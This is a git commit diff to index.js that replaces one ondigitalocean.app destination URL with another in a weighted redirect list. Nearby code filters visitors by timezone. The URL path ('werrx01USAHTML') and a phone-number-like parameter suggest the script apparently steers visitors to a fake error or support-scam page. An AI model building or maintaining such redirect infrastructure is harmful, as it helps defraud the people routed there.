0a808073bcf95892affce7d7de41e400079c7329
paalakash <palaksh452@gmail.com>
2026-06-29 06:06:10 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-2snvj.ondigitalocean.app/werrx01USAHTML/?bcda=1800-043-218", weight: 1.0 }
+    { url: "https://sea-turtle-app-ldrcl.ondigitalocean.app/werrx01USAHTML/?bcda=1800-043-218", weight: 1.0 }
 
 ];
 
